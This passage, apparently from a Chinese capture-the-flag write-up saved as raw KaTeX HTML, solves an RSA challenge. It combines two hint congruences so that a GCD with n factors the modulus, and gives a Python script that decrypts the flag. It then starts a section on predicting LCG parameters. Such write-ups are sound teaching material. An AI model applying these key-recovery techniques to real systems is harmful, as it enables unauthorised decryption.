style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>把整理好的两个式子写在一起</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>2021</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><msup><mi>q</mi><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>−</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>k</mi><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h1\equiv(2021p)^{20212021}+q^{20212021}\pmod n\\(h2-1011)^{20212021}\equiv (1010p)^{20212021}+(kq)^{20212021}\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>这相当于一组二元方程组，可以看到q的系数并不全知道，所以我们对p前的系数进行统一。第一个式子乘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>101</mn><msup><mn>0</mn><mn>20212021</mn></msup></mrow><annotation encoding="application/x-tex">1010^{20212021}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，第二个式子乘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>202</mn><msup><mn>1</mn><mn>20212021</mn></msup></mrow><annotation encoding="application/x-tex">2021^{20212021}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，就得到以下式子</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1010</mn><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>∗</mo><mi>h</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mo>∗</mo><mn>2021</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mn>2021</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>−</mo><mn>1011</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mo>∗</mo><mn>2021</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>∗</mo><mi>k</mi><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1010)^{20212021}*h1\equiv(1010*2021p)^{20212021}+(1010q)^{20212021}\pmod n\\(2021*(h2-1011))^{20212021}\equiv (1010*2021p)^{20212021}+(2021*kq)^{20212021}\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>上下相减，可以消去p项，留下q项，得到以下式子</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1010</mn><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>∗</mo><mi>h</mi><mn>1</mn><mo>−</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>−</mo><mn>1011</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mn>1010</mn><mo>−</mo><mn>2021</mn><mo>∗</mo><mi>k</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup></mrow><annotation encoding="application/x-tex">(1010)^{20212021}*h1-(2021*(h2-1011))^{20212021}\equiv((1010-2021*k)*q)^{20212021}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>这个式子显然是q的倍数，于是我们把计算结果和n求最大公约数，就可以分解n，从而得到flag。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n<span class="token operator">=</span><span class="token number">16785815493192323072561202520621502124354484873141439416485516896177209180170954358917536655296832389378159385508553582292316986439935870611836481627326624997826278718936899131627405269577001541561786652522795230359038066756500166621870294967504124007392361309677236631475857268249665705586160191841238378747704555589725214417560311950480552359244858338836565084199965357719917862865124721829629583801017461751844801305560796234037169537157236798038347132037065583033136175781724971303334634074643113231202854595470566133689932557205673653855603056520355846208058018605770349841277407297822002222655287986001654291931</span>hint1<span class="token operator">=</span><span class="token number">9100042084582559120159031222877385918131627674965428834732092483610222485185500852690169889158524199071605287690845087305188994225784309780346317628828223709405785692567210943043233210503182916135218501703770962120690794212530724251491005258749274621926983941779357144111637154016600411666779133073494389367203037839113492716852468953430962340504727673205375932008380231967356987830939184941935559824751997435555229308732296050345353884892269792098915710385538823080718443304466681676033122340721360871484264707931485035700119764663528137240048303559376884120155943565064746404763004240115053288163324152157473617990</span>hint2<span class="token operator">=</span><span class="token number">9715835317933770028352656960194612511232332508578016476234653979758738724483036248158492859699534774069055258691831221183554038938838861427968839315936796645021031146434403767322049813439272141318924746372792359202961866805563916806745433288822292142587118556212747743843666517677675229877703300490191424342819740469916571702460052662852376459432341889334300260369825585572770112675953798390556158097350576177067289449449873243010686716960572551733859485003137822891360533488207469003452641541262228655905655933669756058464699629520449342902123166997135656358968094821077563145658394017534114487847397469149938035501</span>c<span class="token operator">=</span><span class="token number">12824901853900928176431805967670922082099408423359348740734692908225214283313020989235896494342846615758839954388241321859784138067628962023114456647732896918446926075150525242914486413449921088854955092881525457824965211111708060188052025883249556408765110000416480911959539207515903372662706942051175602406993472605337450011214198253823995374918086046571064526610180657696977528863091044723572782646772325280660263920280922710139393502451340521170658459979145980603061780857907568888355186816350804498385690058379721372491179071169195852152316654113738209736216721551163445193680416946172818040555458013285013076026</span>e<span class="token operator">=</span><span class="token number">65537</span>q <span class="token operator">=</span> GCD<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token builtin">pow</span><span class="token punctuation">(</span>hint2<span class="token operator">-</span><span class="token number">1011</span><span class="token punctuation">,</span><span class="token number">20212021</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2021</span><span class="token punctuation">,</span><span class="token number">20212021</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">-</span>hint1<span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">1010</span><span class="token punctuation">,</span><span class="token number">20212021</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> n<span class="token operator">//</span>qphi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="predict-1">Predict 1</h3><p>一个求LCG参数的题目。</p><p>根据题目的方法，我们有19次机会可以获得里面的state，然后再进行预测。但实际上，一般获取8组数据，就可以获取<span class="katex"><span class="katex-mathml"><math 